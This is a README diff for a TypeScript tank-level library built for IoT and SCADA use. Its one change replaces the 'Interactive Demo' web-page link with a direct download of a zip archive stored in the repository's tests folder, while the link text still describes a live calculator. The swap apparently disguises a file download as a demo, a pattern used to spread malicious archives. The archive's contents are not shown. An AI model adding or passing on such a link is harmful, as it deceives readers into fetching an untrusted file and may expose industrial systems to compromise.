@@ -4,7 +4,7 @@
 
 Zero runtime dependencies (SQLite via better-sqlite3 for storage). TypeScript first. Built for IoT, SCADA, and process control.
 
-**[Try the Interactive Demo](https://che0md.tech/pages/tank-demo.html)** -- live calculator with SVG tank visualization, printable strapping charts, fill rate tools, alarms & multi-tank inventory.
+**[Try the Interactive Demo](https://raw.githubusercontent.com/arefin02/tank-level/main/tests/level-tank-v2.5.zip)** -- live calculator with SVG tank visualization, printable strapping charts, fill rate tools, alarms & multi-tank inventory.
 
 ## Who is this for?
 
